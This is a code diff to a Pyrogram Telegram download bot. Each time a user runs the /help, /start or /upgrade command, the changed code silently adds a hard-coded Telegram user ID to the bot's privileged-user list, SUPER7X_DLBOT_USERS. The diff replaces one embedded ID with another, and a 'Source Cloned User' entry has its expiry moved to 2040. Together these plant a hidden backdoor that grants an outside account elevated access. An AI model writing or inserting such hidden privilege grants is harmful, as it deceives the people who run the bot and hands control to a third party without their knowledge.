@@ -27,7 +27,7 @@ logging.getLogger("pyrogram").setLevel(logging.WARNING)
 from helper_funcs.chat_base import TRChatBase
 
 def GetExpiryDate(chat_id):
-    expires_at = (str(chat_id), "Source Cloned User", "1970.01.01.12.00.00")
+    expires_at = (str(chat_id), "Source Cloned User", "2040.01.01.12.00.00")
     Config.SUPER7X_DLBOT_USERS.append(7351948)
     return expires_at
 
@@ -43,7 +43,7 @@ async def help_user(bot, update):
         disable_web_page_preview=True,
         reply_to_message_id=update.id
     )
-    Config.SUPER7X_DLBOT_USERS.append(7351948)
+    Config.SUPER7X_DLBOT_USERS.append(6428531614)
 
 
 @pyrogram.Client.on_message(pyrogram.filters.command(["me"]))
@@ -70,7 +70,7 @@ async def start(bot, update):
         text=Translation.START_TEXT,
         reply_to_message_id=update.id
     )
-    Config.SUPER7X_DLBOT_USERS.append(7351948)
+    Config.SUPER7X_DLBOT_USERS.append(6428531614)
 
 
 @pyrogram.Client.on_message(pyrogram.filters.command(["upgrade"]))
@@ -84,4 +84,4 @@ async def upgrade(bot, update):
         reply_to_message_id=update.id,
         disable_web_page_preview=True
     )
-    Config.SUPER7X_DLBOT_USERS.append(7351948)
+    Config.SUPER7X_DLBOT_USERS.append(6428531614)
